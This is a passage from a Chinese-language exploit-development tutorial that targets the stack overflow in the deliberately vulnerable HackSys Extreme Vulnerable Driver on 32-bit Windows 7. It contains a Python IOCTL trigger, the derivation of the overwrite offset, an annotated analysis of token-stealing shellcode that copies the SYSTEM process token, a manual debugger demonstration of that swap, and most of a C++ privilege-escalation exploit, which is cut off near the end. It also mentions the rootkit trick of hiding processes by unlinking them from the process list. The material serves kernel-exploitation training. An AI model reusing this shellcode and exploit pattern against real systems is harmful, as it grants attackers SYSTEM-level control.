+&nbsp;&nbsp;&nbsp;&nbsp;hDevice&nbsp;=&nbsp;kernel32.CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;,&nbsp;0xC0000000,&nbsp;0,&nbsp;None,&nbsp;0x3,&nbsp;0,&nbsp;None)
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;hDevice&nbsp;or&nbsp;hDevice&nbsp;==&nbsp;-1:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[!]&nbsp;Failed&nbsp;to&nbsp;get&nbsp;a&nbsp;handle&nbsp;to&nbsp;the&nbsp;driver&nbsp;&quot;&nbsp;+&nbsp;str(ctypes.GetLastError())
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1
+&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;=&nbsp;&quot;\x41&quot;&nbsp;*&nbsp;(1024&nbsp;*&nbsp;4)&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;bufSize&nbsp;&nbsp;=&nbsp;len(buf)
+&nbsp;&nbsp;&nbsp;&nbsp;bufPtr&nbsp;=&nbsp;id(buf)&nbsp;+&nbsp;20
+&nbsp;&nbsp;&nbsp;&nbsp;kernel32.DeviceIoControl(hDevice,&nbsp;0x222003,&nbsp;bufPtr,&nbsp;bufSize,&nbsp;None,&nbsp;0,byref(lpBytesReturned),&nbsp;None)
+if&nbsp;__name__&nbsp;==&nbsp;&#39;__main__&#39;:
+&nbsp;&nbsp;&nbsp;&nbsp;main()
+#&nbsp;EOF</pre><p style="text-align:center"><img src="http://p7.qhimg.com/t012e94e3120866b43c.png" title="t01faeaf81ed7f90da2.png" alt="http://p2.qhimg.com/t01faeaf81ed7f90da2.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果我们将缓冲区大小更改为0x900，您可以看到我们可以看到EIP点到我们的缓冲区。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01a1efe53d968bc0ea.png" title="t013552c22335f40968.png" alt="http://p8.qhimg.com/t013552c22335f40968.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">开发这个驱动程序的漏洞与开发一个用户空间应用程序的漏洞非常相似。现在我们必须找到我们覆盖返回地址的偏移量，以便EIP指向它。我将使用Mona创建一个0x900的模式。</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t013c051c1cd02942c1.png" title="t015792e49870c2c17f.png" alt="http://p2.qhimg.com/t015792e49870c2c17f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">发送这个长缓冲区后，我们可以看到EIP包含值0x72433372（r3Cr）。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t016f48a791447635f4.png" title="t01ea17908513a099a8.png" alt="http://p6.qhimg.com/t01ea17908513a099a8.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们用Mona找到偏移。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t012beea38b1f6fd688.png" title="t01c55601b02bf22fbd.png" alt="http://p2.qhimg.com/t01c55601b02bf22fbd.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">偏移量为2080.覆盖EBP寄存器的偏移量为2080 - 4 = 2076. POP EBP，RET。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Shellcode分析</span></strong></span></p><hr/><p style="text-align: center; text-indent: 0em;"><img src="http://p0.qhimg.com/t01e9d83e5da5995bce.png" title="t012d5aec211d767d29.png" alt="http://p5.qhimg.com/t012d5aec211d767d29.png" style="text-align: center;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先，我们保存所有寄存器的状态以避免任何BSOD。接下来，我们清除eax寄存器，并将_KPCR.PcrbData.CurrentThread移动到eax中。我们先来探讨KPRC（内核处理器控制区）的结构。KPCR包含由内核和HAL（硬件抽象层）共享的每CPU信息。它将存储有关CPU状态和信息的关键信息。它位于32位Windows系统索引为0的FS段寄存器的基址，[FS：30]，64位系统位于GS段寄存器[GS：0]中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们可以在偏移量0x120处看到它指向“PrcData”，它是类型为KPRCB（内核处理器控制块）的结构。此结构包含有关处理器的信息，如当前运行的线程，下一个运行线程，类型，模型，速度等。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01b5807bac384efff6.png" title="t01f7735d2394977f24.png" alt="http://p5.qhimg.com/t01f7735d2394977f24.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果我们探索“PrcData”_KPRCB结构，我们可以在偏移0x4&#39;CurrentThread&#39;找到_KTHREAD（内核线程）结构。此结构嵌入在ETHREAD结构内。ETHREAD结构由Windows内核用来表示系统中的每个线程。这由[FS：0x124]表示。</span></p><pre class="brush:plain;toolbar:false">mov&nbsp;eax,&nbsp;[fs:eax&nbsp;+&nbsp;0x124]</pre><p style="text-align:center"><img src="http://p9.qhimg.com/t01448b41ebb350160c.png" title="t011a0b16cd5021ebd8.png" alt="http://p8.qhimg.com/t011a0b16cd5021ebd8.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">紧接着_KTHREAD.ApcState.Process被提取到EAX中。在此我们来探讨下_KTHREAD结构。在偏移量0x40处，我们可以找到“ApcState”，它是_KAPC_STATE。当线程附加到另一进程时，KAPC_STATE用于保存排队到线程的APC列表（异步过程调用）。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01ad1eae1ebd24ee7d.png" title="t01765847513ffb1465.png" alt="http://p4.qhimg.com/t01765847513ffb1465.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果进一步了解_KAPC_STATE结构，我们可以找到一个指向当前进程结构的指针，偏移量为0x10，“Process”为_KPROCESS结构。KPROCESS结构嵌入在EPROCESS结构内，它包含调度相关信息，如线程，量子，优先级和执行时间。这是在shellcode中完成的</span></p><pre class="brush:plain;toolbar:false">mov&nbsp;eax,&nbsp;[eax&nbsp;+&nbsp;0x50]</pre><p style="text-align:center"><img src="http://p1.qhimg.com/t015b7a26a11f4ac44d.png" title="t0163d7bbe3a744ca71.png" alt="http://p3.qhimg.com/t0163d7bbe3a744ca71.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我观察到了一个与“PsGetCurrentProcess”函数中使用的方法相同的方法。此函数使用与此shellcode相同的指令来获取当前的EPROCESS。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01908e8cc544335367.png" title="t0191ca945429980459.png" alt="http://p2.qhimg.com/t0191ca945429980459.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果我们探索这个结构，我们可以看到偏移0xb4的&#39;UniqueProcessId&#39;值为0x4，这意味着这是&#39;System&#39;进程的PID。在偏移0xb8，您可以找到_LIST_ENTRY数据结构的“ActiveProcessLinks”。在偏移0x16c&#39;ImageFileName&#39;包含值&#39;System&#39;。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t012d011147a0d2f0e6.png" title="t017fb067741b1d863d.png" alt="http://p8.qhimg.com/t017fb067741b1d863d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">_LIST_ENTRY数据结构是双链表。它的头指针是“Flink”，尾部指针是“Blink”。我们可以使用“ActiveProcessLinks”双链表遍历整个系统中的进程并找到“系统”进程。_EPROCESS结构也用于rootkits，以将用户界面的进程隐藏起来。如果您已经在C中完成了算法，则与从双链表中删除节点相似。我们只需将Flink更改为下一个节点，并将Blink更改为上一个节点，从而使我们的进程远离链表。你可能会想知道这个过程是如何工作的。进程只是一个线程容器。真正的交易是与线程。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t014f1036c49ba596d6.png" title="t01944bb919be90bceb.png" alt="http://p0.qhimg.com/t01944bb919be90bceb.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">shellcode中使用以下汇编代码遍历双链表，并查找进程ID为0x4。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">SearchSystemPID:
+&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;[eax&nbsp;+&nbsp;0x0B8]&nbsp;;&nbsp;Get&nbsp;nt!_EPROCESS.ActiveProcessLinks.Flink
+&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;eax,&nbsp;0x0B8
+&nbsp;&nbsp;&nbsp;&nbsp;cmp[eax&nbsp;+&nbsp;0x0B4],&nbsp;edx&nbsp;;&nbsp;Get&nbsp;nt!_EPROCESS.UniqueProcessId
+&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;SearchSystemPID</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一旦找到“系统”进程，我们将当前进程的token替换为“系统”进程的token值。“token”的偏移量为0xf8。最后我们恢复寄存器的状态。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">mov&nbsp;edx,&nbsp;[eax&nbsp;+&nbsp;0x0F8]&nbsp;;&nbsp;Get&nbsp;SYSTEM&nbsp;process&nbsp;nt!_EPROCESS.Token
+mov[ecx&nbsp;+&nbsp;0x0F8],&nbsp;edx&nbsp;;&nbsp;Replace&nbsp;our&nbsp;current&nbsp;token&nbsp;to&nbsp;SYSTEM
+popad</pre><p style="text-align:center"><img src="http://p9.qhimg.com/t01ba06199f2de872b3.png" title="t0114b584312873d7b8.png" alt="http://p6.qhimg.com/t0114b584312873d7b8.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们可以在运行时使用调试器。例如，我将打开&#39;notepad.exe&#39;。您可以看到它作为普通用户运行。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t012a6c64387d3acab7.png" title="t01b28a7881fad2e056.png" alt="http://p1.qhimg.com/t01b28a7881fad2e056.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">检查指向“notepad.exe”的_EPROCESS结构的指针，它是853fed28。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t013cbdf6c148d5fae5.png" title="t01d5f6452c6c6874d2.png" alt="http://p3.qhimg.com/t01d5f6452c6c6874d2.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">指向“System”的_EPROCESS结构的指针是8514a798。</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t013385a2a3a46b4b00.png" title="t01c3372480cb8dccfb.png" alt="http://p3.qhimg.com/t01c3372480cb8dccfb.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们来检查&#39;系统&#39;进程的令牌的值。它是0x88e0124b。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01fec321ed7fa43ec9.png" title="t013ff73ccaa05d29a4.png" alt="http://p9.qhimg.com/t013ff73ccaa05d29a4.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们可以通过取消设置0x88e0124b的最后3位来计算令牌的值。我们可以通过执行按位AND和0x3来做到这一点。</span></p><pre class="brush:plain;toolbar:false">0x88e0124b&nbsp;&amp;~&nbsp;3&nbsp;=&nbsp;0x88e01248</pre><p style="text-align:center"><img src="http://p3.qhimg.com/t01a15e683381f399f9.png" title="t01af3f93d17a7cf13e.png" alt="http://p5.qhimg.com/t01af3f93d17a7cf13e.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们可以通过!process命令验证我们的值是否正确。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01b06c69f6d3c19e52.png" title="t011491f071307f3bd8.png" alt="http://p6.qhimg.com/t011491f071307f3bd8.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">之后，我们可以在记事本进程的0xf8处输入系统令牌值到令牌偏移量。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01fc9b2a7e2df2ea44.png" title="t017ce726ed5c8ba23f.png" alt="http://p6.qhimg.com/t017ce726ed5c8ba23f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在，如果我们检查Process Explorer，我们可以看到Notepad.exe作为&#39;NT AUTHORITY / SYSTEM&#39;运行。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t019be3063d163840e9.png" title="t019733a1b8780fc038.png" alt="http://p7.qhimg.com/t019733a1b8780fc038.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最终的利用代码</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们映射shellcode函数的地址，以便EIP将跳转到它并执行我们的shellcode。为了确保一切正确，我们可以在调试器中进行分析。我们先来获取&#39;lpInBuffer&#39;的地址。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01f5d3fe4353f6e977.png" title="t01aa4663bb83a2f9a8.png" alt="http://p7.qhimg.com/t01aa4663bb83a2f9a8.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在偏移2076是EBP覆盖，之后它应该包含指向shellcode函数的指针。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t012bea5ccc02a1f830.png" title="t01ffabf4425e2d67dd.png" alt="http://p9.qhimg.com/t01ffabf4425e2d67dd.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们重新组装这个指针。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01556ba64c5b1ff7bb.png" title="t019c18dcf4497abae8.png" alt="http://p9.qhimg.com/t019c18dcf4497abae8.png" style="white-space: normal;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">是的，如果一切正确，它应该指向我们的shellcode函数。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t019ce75a55e8703d24.png" title="t011d64af83653059de.png" alt="http://p1.qhimg.com/t011d64af83653059de.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">C++版利用代码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">//https://github.com/OsandaMalith/Exploits/blob/master/HEVD/StackOverflowx86.cpp
+#include&nbsp;&quot;stdafx.h&quot;
+#include&nbsp;&lt;Windows.h&gt;
+#include&nbsp;&lt;Shlobj.h&gt;
+#include&nbsp;&lt;string.h&gt;
+/*
+&nbsp;*&nbsp;Title:&nbsp;HEVD&nbsp;x86&nbsp;Stack&nbsp;Overflow&nbsp;Privelege&nbsp;Escalation&nbsp;Exploit
+&nbsp;*&nbsp;Platform:&nbsp;Windows&nbsp;7&nbsp;x86
+&nbsp;*&nbsp;Author:&nbsp;Osanda&nbsp;Malith&nbsp;Jayathissa&nbsp;(@OsandaMalith)
+&nbsp;*&nbsp;Website:&nbsp;https://osandamalith.com
+&nbsp;*/
+#define&nbsp;KTHREAD_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x124&nbsp;&nbsp;//&nbsp;nt!_KPCR.PcrbData.CurrentThread
+#define&nbsp;EPROCESS_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;0x050&nbsp;&nbsp;//&nbsp;nt!_KTHREAD.ApcState.Process
+#define&nbsp;PID_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0B4&nbsp;&nbsp;//&nbsp;nt!_EPROCESS.UniqueProcessId
+#define&nbsp;FLINK_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0B8&nbsp;&nbsp;//&nbsp;nt!_EPROCESS.ActiveProcessLinks.Flink
+#define&nbsp;TOKEN_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0F8&nbsp;&nbsp;//&nbsp;nt!_EPROCESS.Token
+#define&nbsp;SYSTEM_PID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x004&nbsp;&nbsp;//&nbsp;SYSTEM&nbsp;Process&nbsp;PID
+VOID&nbsp;TokenStealingPayloadWin7()&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;__asm&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pushad;&nbsp;Save&nbsp;registers&nbsp;state
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;eax,&nbsp;eax;&nbsp;Set&nbsp;ZERO
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;fs:[eax&nbsp;+&nbsp;KTHREAD_OFFSET];&nbsp;Get&nbsp;nt!_KPCR.PcrbData.CurrentThread
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;[eax&nbsp;+&nbsp;EPROCESS_OFFSET];&nbsp;Get&nbsp;nt!_KTHREAD.ApcState.Process
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ecx,&nbsp;eax;&nbsp;Copy&nbsp;current&nbsp;process&nbsp;_EPROCESS&nbsp;structure
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edx,&nbsp;SYSTEM_PID;&nbsp;WIN&nbsp;7&nbsp;SP1&nbsp;SYSTEM&nbsp;process&nbsp;PID&nbsp;=&nbsp;0x4
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SearchSystemPID:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;[eax&nbsp;+&nbsp;FLINK_OFFSET];&nbsp;Get&nbsp;nt!_EPROCESS.ActiveProcessLinks.Flink
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;eax,&nbsp;FLINK_OFFSET
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp[eax&nbsp;+&nbsp;PID_OFFSET],&nbsp;edx;&nbsp;Get&nbsp;nt!_EPROCESS.UniqueProcessId
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;SearchSystemPID
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edx,&nbsp;[eax&nbsp;+&nbsp;TOKEN_OFFSET];&nbsp;Get&nbsp;SYSTEM&nbsp;process&nbsp;nt!_EPROCESS.Token
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov[ecx&nbsp;+&nbsp;TOKEN_OFFSET],&nbsp;edx;&nbsp;Replace&nbsp;target&nbsp;process&nbsp;nt!_EPROCESS.Token
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;with&nbsp;SYSTEM&nbsp;process&nbsp;nt!_EPROCESS.Token
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;End&nbsp;of&nbsp;Token&nbsp;Stealing&nbsp;Stub
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;popad;&nbsp;Restore&nbsp;registers&nbsp;state
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Kernel&nbsp;Recovery&nbsp;Stub
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;eax,&nbsp;eax;&nbsp;Set&nbsp;NTSTATUS&nbsp;SUCCEESS
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;esp,&nbsp;12;&nbsp;Fix&nbsp;the&nbsp;stack
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;ebp;&nbsp;Restore&nbsp;saved&nbsp;EBP
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;8;&nbsp;Return&nbsp;cleanly
+&nbsp;&nbsp;&nbsp;&nbsp;}
+}
+int&nbsp;_tmain(int&nbsp;argc,&nbsp;_TCHAR*&nbsp;argv[])&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hDevice;
+&nbsp;&nbsp;&nbsp;&nbsp;LPCWSTR&nbsp;lpDeviceName&nbsp;=&nbsp;L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;;
+&nbsp;&nbsp;&nbsp;&nbsp;PUCHAR&nbsp;lpInBuffer&nbsp;=&nbsp;NULL;
+&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;lpBytesReturned&nbsp;=&nbsp;0;
+&nbsp;&nbsp;&nbsp;&nbsp;STARTUPINFO&nbsp;si&nbsp;=&nbsp;{&nbsp;sizeof(STARTUPINFO)&nbsp;};
+&nbsp;&nbsp;&nbsp;&nbsp;PROCESS_INFORMATION&nbsp;pi;
+&nbsp;&nbsp;&nbsp;&nbsp;hDevice&nbsp;=&nbsp;CreateFile(
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lpDeviceName,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE_SHARE_WRITE,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPEN_EXISTING,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE_FLAG_OVERLAPPED&nbsp;|&nbsp;FILE_ATTRIBUTE_NORMAL,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[*]&nbsp;Author:&nbsp;@OsandaMalith\n[*]&nbsp;Website:&nbsp;https://osandamalith.com\n\n&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[+]&nbsp;lpDeviceName:&nbsp;%ls\n&quot;,&nbsp;lpDeviceName);
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(hDevice&nbsp;==&nbsp;INVALID_HANDLE_VALUE)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[!]&nbsp;Failed&nbsp;to&nbsp;get&nbsp;a&nbsp;handle&nbsp;to&nbsp;the&nbsp;driver.&nbsp;0x%x\n&quot;,&nbsp;GetLastError());
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[+]&nbsp;Device&nbsp;Handle:&nbsp;0x%x\n&quot;,&nbsp;hDevice);
+&nbsp;&nbsp;&nbsp;&nbsp;lpInBuffer&nbsp;=&nbsp;(PUCHAR)HeapAlloc(GetProcessHeap(),&nbsp;HEAP_ZERO_MEMORY,&nbsp;0x900);
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!lpInBuffer)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[!]&nbsp;Failed&nbsp;to&nbsp;allocated&nbsp;memory.&nbsp;%x&quot;,&nbsp;GetLastError());
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;RtlFillMemory(lpInBuffer,&nbsp;0x900,&nbsp;0x41);
+&nbsp;&nbsp;&nbsp;&nbsp;RtlFillMemory(lpInBuffer&nbsp;+&nbsp;2076,&nbsp;0x4,&nbsp;0x42);
+&nbsp;&nbsp;&nbsp;&nbsp;*(lpInBuffer&nbsp;+&nbsp;2080)&nbsp;=&nbsp;(DWORD)&amp;TokenStealingPayloadWin7&nbsp;&amp;&nbsp;0xFF;
+&nbsp;&nbsp;&nbsp;&nbsp;*(lpInBuffer&nbsp;+&nbsp;2080&nbsp;+&nbsp;1)&nbsp;=&nbsp;((DWORD)&amp;TokenStealingPayloadWin7&nbsp;&amp;&nbsp;0xFF00)&nbsp;&gt;&gt;&nbsp;8;
+&nbsp;&nbsp;&nbsp;&nbsp;*(lpInBuffer&nbsp;+&nbsp;2080&nbsp;+&nbsp;2)&nbsp;=&nbsp;((DWORD)&amp;TokenStealingPayloadWin7&nbsp;&amp;&nbsp;0xFF0000)&nbsp;&gt;&gt;&nbsp;0x10;
+&nbsp;&nbsp;&nbsp;&nbsp;*(lpInBuffer&nbsp;+&nbsp;2080&nbsp;+&nbsp;3)&nbsp;=&nbsp;((DWORD)&amp;TokenStealingPayloadWin7&nbsp;&amp;&nbsp;0xFF000000)&nbsp;&gt;&gt;&nbsp;0x18;
+&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[+]&nbsp;Sending&nbsp;IOCTL&nbsp;request&nbsp;with&nbsp;buffer:&nbsp;0x222003\n&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;DeviceIoControl(
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hDevice,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x222003,&nbsp;//&nbsp;IOCTL
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(LPVOID)lpInBuffer,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2084,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;lpBytesReturned,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;ZeroMemory(&amp;si,&nbsp;sizeof&nbsp;si);
